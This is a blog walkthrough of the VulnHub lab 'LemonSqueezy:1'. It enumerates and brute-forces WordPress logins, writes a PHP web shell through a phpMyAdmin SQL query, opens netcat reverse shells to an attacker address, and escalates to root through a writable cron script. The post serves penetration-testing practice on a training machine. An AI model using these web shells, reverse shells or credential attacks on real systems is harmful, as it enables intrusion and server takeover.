<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">LemonSqueezy:1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/lemonsqueezy1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-06-06T10:04:09+00:00">June 6, 2020</time><time class="updated" datetime="2025-06-10T20:10:30+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another boot2root challenge called “LemonSqueezy:1”. It is available on Vulnhub for the purpose of Penetration Testing practices. This lab is not that difficult if we have the proper basic knowledge of cracking the labs. This credit of making this lab goes to James Hay. Let’s start and learn how to successfully breach it.</span></p>
<p><strong><span style="color: #000000;">Level: Easy to Intermediate</span></strong></p>
<p><span style="color: #000000;">Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/lemonsqueezy-1,473/">here</a></strong></span></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<p><span style="color: #000000;">Nmap</span></p>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Abusing HTTP Services</span></li>
<li><span style="color: #000000;"><strong>Web Directory Bruteforce (dirb)</strong></span></li>
<li><span style="color: #000000;"><strong>Wpscan for Username and Password Enumeration</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>Logging to WordPress</strong></span></li>
<li><span style="color: #000000;"><strong>Shell Uploading through PhpMyAdmin</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong>Post Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>Using LinEnum.sh </strong></span></li>
<li><span style="color: #000000;"><strong>Creating Netcat Shell using msfvenom</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong> Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>Abusing cronjob for Writable Script</strong></span></li>
<li><span style="color: #000000;"><strong>Capture the flag</strong></span></li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<p><span style="color: #000000;">As you know, this is the initial phase where we choose <strong>netdiscover</strong> for network scan for identifying host IP and this we have <strong>192.168.1.105</strong> as our host IP.</span></p>
<p><span style="color: #000000;">Then we used nmap for port enumeration. We found port 80 for http.</span></p>
<pre class="lang:default decode:true">nmap -A 192.168.1.105</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-m60bRKqavsc/Xttl_6p99zI/AAAAAAAAka8/kmAd2MY3YxkQYTu5iNrxOkjtBEySt0DwgCLcBGAsYHQ/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">For more detail, we will be needing to start enumeration against the host machine. Since port 80 is open I look toward browser and explore target ip 192.168.1.105 . But it is not much of great help. Moving on.</span></p>
<pre class="lang:default decode:true">http://192.168.1.105</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-p9GTtFu2aqw/XttmDPCanjI/AAAAAAAAkbg/kZX24644FuwCyFEtaR8PsLnOTE9w19e9gCLcBGAsYHQ/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Further, we use dirb for directory brute-forcing and found phpmyadmin &amp; wordpress page with status code 200 OK on executing following command.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.105</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EWrzSZkth3c/XttmDxRf5zI/AAAAAAAAkbw/DKwlF773jy8zPegDptCIPikd4PyidJn2ACLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">When we searched the above-listed page, i.e. wordpress we found nothing useful.</span></p>
<pre class="lang:default decode:true">http://192.168.1.105/wordpress</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JS9wAm4OLM4/XttmEB6_XTI/AAAAAAAAkb0/LrSGDi3oy48Oge7PxaC6OOwqIZcCn9fKgCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">So, the first idea that came to us was to run a wpscan on the webpage and see what the scan enumerates.</span></p>
<pre class="lang:default decode:true">wpscan --url http://192.168.1.105/wordpress -e u</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4VHHTy72S8w/XttmEezVSvI/AAAAAAAAkb4/6eTbbP40yakLSha92TfUVogJGn7a2HZJQCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">I found two user names: orange and lemon.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-91isPZNq-cE/XttmEtQ2E-I/AAAAAAAAkb8/XC5UECORi5QFypzDZoyzk8fGdcMOmtxhQCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now the next job is to hunt for a password for user orange for which we will use rockyou.txt. Time to fire up wpscan with our username &amp; password list to valid user login combination.</span></p>
<pre class="lang:default decode:true">wpscan --url http://192.168.1.105/wordpress -U orange -P /usr/share/wordlist/rockyou.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hm_U6qeLy80/XttmE4a6HCI/AAAAAAAAkcA/i20fkY6mmCklELw5Vhgkg0u0Q2X_IKf7QCLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">We have successfully found the password for orange. Let’s make good use of them.</span></p>
<pre class="lang:default decode:true">Orange:ginger</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--VMIZHvhu0w/XttmE_lZ6fI/AAAAAAAAkcE/7rpxEvPBuuooRTQr3dDMGTBPLAQ_6Ax0ACLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;"> Now we mapped the domain name with the target machine’s IP address in the /etc/hosts file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9BxmbHYrziY/XttmFJKc_II/AAAAAAAAkcI/szo7ZkROE50GLuG1ZLxjKUcYwPtOo6c5QCLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Further, we login to WordPress using orange credentials. It was holding another clue for us in edit post section we found a password i.e. nOt1n@wOrdl1st! .</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iqY4xp8TdRQ/Xttl_2aQxQI/AAAAAAAAka0/q2OZ6zeQfa4PcuAiP5OKKooGwuOJ1CUkACLcBGAsYHQ/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now our next job is to try to login phpmyadmin page with this password using user orange.</span></p>
<pre class="lang:default decode:true">http://192.168.1.105/phpmyadmin</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-v8otmHAba60/Xttl_2WcmSI/AAAAAAAAka4/1CaBYi_lSYIuTf-kwehXqSMZpM-KF0hLQCLcBGAsYHQ/s1600/11.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">After logging in let’s explore the page further to find some juicy information.</span></p>
<p><span style="color: #000000;">Here we found the database named wordpress.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yjS5OAS15yM/XttmA87oQGI/AAAAAAAAkbA/8JWJEfegP1IA9JUM-x_xaUQVlewrhVqXACLcBGAsYHQ/s1600/12.png"/></span></p>
<p><span style="color: #000000;">So, we have login into phpmyadmin, now it was time to exploit phpMyAdmin to get a reverse connection and we have already published a post on “<span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/">Shell Uploading in Web Server through PhpMyAdmin</a></strong></span>”. With the help of this post, I try to exploit phpMyAdmin and follow the given steps.</span></p>
<p><span style="color: #000000;">Within the database of WordPress, we created a <strong>table</strong> as I have given <strong>raj</strong> and <strong>click</strong> on <strong>create</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l3z2UGHdzeU/XttmBJYigVI/AAAAAAAAkbE/3OfW1gr50Isokz4NY9xo3KldFBtZK_W6gCLcBGAsYHQ/s1600/13.png"/></span></p>
<p><span style="color: #000000;"><strong>Click</strong> on <strong>raj </strong>to construct an MYSQL query inside your database. Hence <strong>click</strong> on <strong>SQL</strong> tab where you can enter the SQL query code.</span></p>
<p><span style="color: #000000;">Now, the next part is interesting because here I am going to execute malicious code as SQL query which will create a Remote code Execution inside the webserver. In the following screenshot, you can see I have given above malicious php code as SQL query and then <strong>click </strong>on <strong>GO </strong>tab to execute it.</span></p>
<pre class="lang:default decode:true">SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/wordpress/backdoor.php"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FumK8I8dvUw/XttmBPuWAmI/AAAAAAAAkbI/ZUJN7cfw69w70LfjkmK0dtXObp6EYWvBwCLcBGAsYHQ/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now type the following URL to find whether we are successful or not in order to create RCE vulnerability.</span></p>
<pre class="lang:default decode:true">http://192.168.1.101:81/wordpress/backdoor.php?cmd=whoami</pre>
<p><span style="color: #000000;">When you execute the above URL in the browser you will get the information of victim ‘s PC.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OmJ1f3950H8/XttmBlNPrwI/AAAAAAAAkbM/3OpO0lMtnnsTrs-JCsq1RvSx6_aey12aACLcBGAsYHQ/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now it was time to get netcat reverse connection of the host machine by executing the following URL.</span></p>
<p><span style="color: #000000;"> http://192.168.1.105/wordpress/backdoor.php?cmd=nc  -e /bin/bash 192.168.1.112 1234</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uhIQQZcOl-s/XttmCACJhgI/AAAAAAAAkbQ/V7Nh6JnMDHsKo5ctevHW_XdkZla6iZssQCLcBGAsYHQ/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now before executing the backdoor let’s fire up netcat listener in another terminal.</span></p>
<pre class="lang:default decode:true">nc -lvp 1234</pre>
<p><span style="color: #000000;">Oh Yeah!! We got the reverse shell, but it is not a proper shell. We will spawn a tty shell using python.</span></p>
<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")
ls</pre>
<p><span style="color: #000000;">here we found a text file name user.txt as 1<sup>st</sup> flag. Now let go for Privilege Escalation with the help of Linenum.sh which will help us in post enumeration.</span></p>
<p><span style="color: #000000;">cat user.txt</span></p>
<h3><span style="color: #800000;"><strong>Post Enumeration</strong></span></h3>
<p><span style="color: #000000;">Next, we tried to download <strong>linenum.sh</strong> in /tmp but we were not able to do so because /tmp was not having the permission to do so. Since /var/www/html/wordpress is writable we will try to download there.</span></p>
<p><span style="color: #000000;"><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum.sh</a></strong></span> is bash script used for enumerating the Linux machine to checks which services are running on the machine, privileges access, version information, system information, user information etc.</span></p>
<ol>
<li><span style="color: #000000;">Download the script or get the location where this script is stored.</span></li>
<li><span style="color: #000000;">Host the python server and copy the link of the LinEnum.sh file.</span></li>
<li><span style="color: #000000;">Download the script in the remote host using “wget” command in the “/var/www/html/wordpress” directory.</span></li>
<li><span style="color: #000000;">Change the permission of the LinEnum.sh shell script using “chmod” command.</span></li>
<li><span style="color: #000000;">Now run the script in the remote machine.</span></li>
</ol>
<pre class="lang:default decode:true">cd /var/www/html/wordpress
wget http://192.168.1.112:8000/LinEnum.sh
chmod 777 LinEnum.sh
./LinEnum.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1jN4eNmLk0k/XttmCcISLjI/AAAAAAAAkbY/13XSFhKDBD4nm2XrDkQpXvsLFWq8qtl7QCLcBGAsYHQ/s1600/18.png"/></span></p>
<p><span style="color: #000000;">So here got some information after running the shell script LinEnum.sh</span></p>
<p><span style="color: #000000;">As a result, we found that /etc/logrotate.d/logrotate is writable and also run as cronjob at every 2 minutes after.</span></p>
<pre class="lang:default decode:true">cat /etc/crontab
cd /etc/logrotate.d
ls -la</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QiEYmwZt66U/XttmC9slnnI/AAAAAAAAkbc/R43B-lmpVVY5ZfgzYTgZ9P8vJ6L4SLX-wCLcBGAsYHQ/s1600/19.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">In order to compromise the machine and get the root access, we will use msfvenom for our further exploitation.</span></p>
<pre class="lang:default decode:true">msfvenom -p /cmd/unix/reverse_netcat lhost=192.168.1.112 lport=4444 R</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IAiNkMWP0FQ/XttmDNLBDCI/AAAAAAAAkbk/vFgnenTTTxUM1LbXYG_NA5u68K-z9GKfQCLcBGAsYHQ/s1600/20.png"/></span></p>
<p><span style="color: #000000;">As we know logrotate is writable and run as a cronjob, therefore, I will overwrite this file with the following command.</span></p>
<pre class="lang:default decode:true">echo "code here" &gt; logrotate</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CC8LpvdDHcQ/XttmDdw09YI/AAAAAAAAkbo/KhTHkJFSLvEkVwwuBsPlqBPeUNOJbNz7QCLcBGAsYHQ/s1600/21.png"/></span></p>
<p><span style="color: #000000;">On other hand we will fire up netcat listener in another terminal to get a reverse shell and wait for some 2 minutes as soon as the logrotate will execute as cronjob this will give us root privileges shell and finally capture the final flag.</span></p>
<pre class="lang:default decode:true">nc -lvp 4444
id
cd /root
ls
cat root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-daQjE-mWYz4/XttmDqmlVyI/AAAAAAAAkbs/FWkT3CZpmEQ0C_fGLevOMTx5F_01-xLUwCLcBGAsYHQ/s1600/22.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Japneet Kaur Gandhi </strong>is a Technical Writer, Researcher and Penetration Tester.<strong> Contact <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/japneet-gandhi/">here</a></span></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
